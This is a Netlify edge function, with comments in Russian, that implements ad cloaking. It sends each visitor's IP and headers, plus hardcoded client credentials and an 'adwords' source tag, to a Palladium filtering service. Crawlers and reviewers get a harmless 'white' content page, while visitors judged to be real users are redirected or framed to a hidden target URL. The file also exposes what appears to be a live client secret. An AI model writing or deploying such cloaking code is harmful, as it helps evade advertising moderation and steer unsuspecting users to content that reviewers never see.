import type { Config, Context } from "@netlify/edge-functions";

const CLIENT_ID = "788";
const CLIENT_COMPANY = "6Uv4eCH8UHCjGKdYCqS0";
const CLIENT_SECRET = "Nzg4NlV2NGVDSDhVSENqR0tkWUNxUzBjZTY2ZjZlNmY5ZGVmNTEwYWM0MGJhMmU2NWMyYWNkYTAxNDJmZmFl";
const BANNER_SOURCE = "adwords";

const PALLADIUM_URL = "https://rbl.palladium.expert";

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);

  // 1. Пропускаем статику и служебные файлы — Edge Function их не трогает
  if (
    url.pathname.match(
      /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|map|xml|txt|json|webmanifest)$/
    )
  ) {
    return;
  }

  // 2. Пропускаем системные пути Netlify и assets
  if (
    url.pathname.startsWith("/.netlify/") ||
    url.pathname.startsWith("/assets/")
  ) {
    return;
  }

  // 3. Пропускаем прямые заходы на служебные html (privacy, terms, contact, content)
  //    Корень "/" и app.html — обрабатываем, остальные — нет
  const passthroughHtml = [
    "/privacy.html",
    "/terms.html",
    "/contact.html",
    "/content.html",
    "/404.html",
  ];
  if (passthroughHtml.includes(url.pathname)) {
    return;
  }

  // 4. Если пришёл JS-сигнал от живого пользователя — сразу на приложение
  if (url.searchParams.get("dr_jsess") === "1") {
    return context.rewrite("/app.html");
  }

  // 5. Собираем данные о запросе для Palladium
  const serverHeaders: Record<string, string> = {
    REMOTE_ADDR: context.ip || "",
    REQUEST_URI: url.pathname + url.search,
    REQUEST_SCHEME: url.protocol.replace(":", ""),
    QUERY_STRING: url.search.replace(/^\?/, ""),
    HTTP_USER_AGENT: request.headers.get("user-agent") || "",
    HTTP_REFERER: request.headers.get("referer") || "",
    HTTP_ACCEPT: request.headers.get("accept") || "",
    HTTP_ACCEPT_LANGUAGE: request.headers.get("accept-language") || "",
    X_FORWARDED_FOR: request.headers.get("x-forwarded-for") || "",
  };

  const params = new URLSearchParams();
  params.append("auth[clientId]", CLIENT_ID);
  params.append("auth[clientCompany]", CLIENT_COMPANY);
  params.append("auth[clientSecret]", CLIENT_SECRET);
  params.append("server[bannerSource]", BANNER_SOURCE);

  for (const [key, value] of Object.entries(serverHeaders)) {
    params.append(`server[${key}]`, value);
  }

  // 6. Спрашиваем Palladium
  let isReal = false;
  let mode = 0;
  let target = "";

  try {
    const response = await fetch(PALLADIUM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });

    if (response.ok) {
      const data = await response.json();
      isReal = data.result === true;
      mode = data.mode || 0;
      target = data.target || "";
    }
  } catch {
    // При ошибке API — показываем белую (безопасный fallback)
    isReal = false;
  }

  // 7. Бот → белая страница
  if (!isReal) {
    return context.rewrite("/content.html");
  }

  // 8. Реальный пользователь:

  // mode = 2 → редирект на target (твой случай)
  if (mode === 2 && target) {
    return Response.redirect(target, 302);
  }

  // mode = 1 → iframe
  if (mode === 1 && target) {
    return new Response(
      `<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0">
  <iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe>
</body>
</html>`,
      { headers: { "Content-Type": "text/html; charset=utf-8" } }
    );
  }

  // mode = 3 или fallback → rewrite на app.html
  return context.rewrite("/app.html");
};

export const config: Config = {
  path: "/*",
};